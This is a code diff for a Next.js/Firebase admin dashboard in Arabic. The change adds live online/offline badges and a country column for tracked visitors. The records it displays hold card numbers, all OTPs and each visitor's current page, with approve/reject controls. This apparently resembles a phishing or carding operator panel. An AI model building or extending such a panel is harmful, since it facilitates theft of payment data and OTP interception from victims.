@@ -2,7 +2,7 @@
 
 import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
-import { Trash2 } from "lucide-react";
+import { CheckCircle, Trash2, X } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { ar } from "date-fns/locale";
@@ -15,7 +15,7 @@ import {
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog";
-import { db, auth } from "@/lib/firestore";
+import { db, auth, database } from "@/lib/firestore";
 import {
   collection,
   doc,
@@ -27,6 +27,7 @@ import {
 } from "firebase/firestore";
 import { onAuthStateChanged, signOut } from "firebase/auth";
 import { playNotificationSound } from "@/lib/actions";
+import { onValue, ref } from "firebase/database";
 
 interface Notification {
   id: string;
@@ -52,6 +53,9 @@ interface Notification {
   allOtps: string[];
   status?: "pending" | "approved" | "rejected";
   isHidden?: boolean;
+  isOnline?: boolean
+  lastSeen: string
+  country:string
 }
 
 export default function NotificationsPage1() {
@@ -59,13 +63,32 @@ export default function NotificationsPage1() {
   const [isLoading, setIsLoading] = useState(true);
   const [pageName, setPagename] = useState<string>("");
   const [message, setMessage] = useState<boolean>(false);
+  const [userStatuses, setUserStatuses] = useState<{ [key: string]: string }>({})
+
   const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(
     null
   );
   const [selectedNotification, setSelectedNotification] =
     useState<Notification | null>(null);
   const router = useRouter();
+  const fetchUserStatus = (userId: string) => {
+    const userStatusRef = ref(database, `/status/${userId}`)
 
+    onValue(userStatusRef, (snapshot) => {
+      const data = snapshot.val()
+      if (data) {
+        setUserStatuses((prev) => ({
+          ...prev,
+          [userId]: data.state,
+        }))
+      } else {
+        setUserStatuses((prev) => ({
+          ...prev,
+          [userId]: "offline",
+        }))
+      }
+    })
+  }
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
       if (!user) {
@@ -93,6 +116,11 @@ export default function NotificationsPage1() {
             (notification: any) => !notification.isHidden
           ) as Notification[];
         setNotifications(notificationsData);
+          // Fetch online status for all users
+          notificationsData.forEach((notification) => {
+            fetchUserStatus(notification.id)
+          })
+  
         setIsLoading(false);
         playNotificationSound();
       },
@@ -120,6 +148,33 @@ export default function NotificationsPage1() {
       setIsLoading(false);
     }
   };
+  function UserStatusBadge({ userId }: { userId: string }) {
+    const [status, setStatus] = useState<string>("unknown")
+
+    useEffect(() => {
+      const userStatusRef = ref(database, `/status/${userId}`)
+
+      const unsubscribe = onValue(userStatusRef, (snapshot) => {
+        const data = snapshot.val()
+        if (data) {
+          setStatus(data.state)
+        } else {
+          setStatus("unknown")
+        }
+      })
+
+      return () => {
+        // Clean up the listener when component unmounts
+        unsubscribe()
+      }
+    }, [userId])
+
+    return (
+      <Badge variant="default" className={`${status === "online" ? "bg-green-500" : "bg-red-500"}`}>
+        <span style={{ fontSize: "12px", color: "#fff" }}>{status === "online" ? "متصل" : "غير متصل"}</span>
+      </Badge>
+    )
+  }
 
   const handleDelete = async (id: string) => {
     try {
@@ -201,11 +256,11 @@ export default function NotificationsPage1() {
           <table className="w-full">
             <thead>
               <tr className="border-b border-gray-100">
-                <th className="px-4 py-3 text-right">الإسم</th>
+                <th className="px-4 py-3 text-right">الدولة</th>
                 <th className="px-4 py-3 text-right">المعلومات</th>
                 <th className="px-4 py-3 text-right">الصفحة الحالية</th>
                 <th className="px-4 py-3 text-right">الوقت</th>
-                <th className="px-4 py-3 text-center">الاشعارات</th>
+                <th className="px-4 py-3 text-center">الحالة</th>
                 <th className="px-4 py-3 text-center">حذف</th>
               </tr>
             </thead>
@@ -213,7 +268,7 @@ export default function NotificationsPage1() {
               {notifications.map((notification) => (
                 <tr key={notification.id} className="border-b border-gray-700">
                   <td className="px-4 py-3">
-                    {notification!.personalInfo!.fullName}
+                    {notification?.country}
                   </td>
                   <td className="px-4 py-3">
                     <div className="flex flex-col sm:flex-row gap-2">
@@ -236,9 +291,8 @@ export default function NotificationsPage1() {
                         variant={
                           notification.cardNumber ? "default" : "destructive"
                         }
-                        className={`rounded-md cursor-pointer ${
-                          notification.cardNumber ? "bg-green-500" : ""
-                        }`}
+                        className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""
+                          }`}
                         onClick={() => handleInfoClick(notification, "card")}
                       >
                         {notification.cardNumber
@@ -257,11 +311,7 @@ export default function NotificationsPage1() {
                     })}
                   </td>{" "}
                   <td className="px-4 py-3 text-center">
-                    <Badge variant="default" className="bg-green-500">
-                      {Number.parseInt(
-                        notification!.notificationCount!.toString()!
-                      ) + 1}
-                    </Badge>
+                  <UserStatusBadge userId={notification.id} key={notification.id}/>
                   </td>
                   <td className="px-4 py-3 text-center">
                     <Button
